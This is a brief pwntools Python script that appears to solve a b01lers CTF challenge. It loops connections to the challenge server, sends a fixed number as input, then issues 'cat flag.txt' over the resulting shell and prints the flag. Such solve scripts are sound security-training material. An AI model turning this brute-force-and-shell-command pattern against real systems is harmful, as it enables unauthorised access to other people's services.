#!/usr/bin/python3
from pwn import *


while True:
    #r = process('/home/pooty/shared/biolers/meta')
    r = remote('chal.ctf.b01lers.com','1014')

    r.sendline(b'22090')
    try:
        r.sendline(b'cat flag.txt')
        r.recvline()
        print(r.recvline())
        break
    except:
        pass


